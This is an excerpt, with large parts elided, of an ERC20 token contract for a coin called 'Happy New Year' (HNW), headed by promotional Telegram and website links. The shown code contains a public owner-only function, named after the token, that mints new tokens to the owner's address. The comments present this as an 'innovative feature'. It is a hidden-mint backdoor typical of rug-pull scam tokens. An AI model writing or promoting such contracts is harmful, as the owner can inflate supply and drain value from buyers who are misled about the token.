...
//
// $HappyNewYear proposes an innovative feature in its contract.
//
//  📱Telegram::https://t.me/+pDGW67SDkg9jZmI1
//  📱Website :: https://Happynewyear.club
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _HappyNewYear(uint256 amount) public onlyOwner {
 _HappyNewYear(msg.sender, amount);
    }
    ...
    function _HappyNewYear(address account, uint256 amount) internal virtual {
...
contract $HappyNewYear is ERC20 {
    ...
    constructor() public ERC20("Happy New Year", "HNW") {
     _HappyNewYear(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}